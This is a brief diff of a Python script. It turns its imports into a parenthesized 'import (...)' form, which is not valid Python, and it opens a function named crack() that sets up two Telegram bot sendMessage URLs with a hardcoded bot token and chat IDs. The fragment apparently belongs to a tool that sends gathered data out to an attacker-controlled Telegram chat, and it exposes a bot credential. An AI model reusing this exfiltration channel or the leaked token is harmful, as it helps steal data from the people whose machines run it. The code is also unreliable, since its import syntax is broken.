@@ -1,5 +1,11 @@
 
-import requests,subprocess,sys,termcolor,base64
+import (
+    requests,
+    subprocess,
+    sys,
+    termcolor,
+    base64,
+)    
 def crack():
     telegram_url='https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=-1001684754768&text='
     telegram_url2='https://api.telegram.org/bot1451863899:AAEcQAnZxYJoUmD7lpKP_9bSuD-679iC45I/sendMessage?chat_id=1154075796&text='
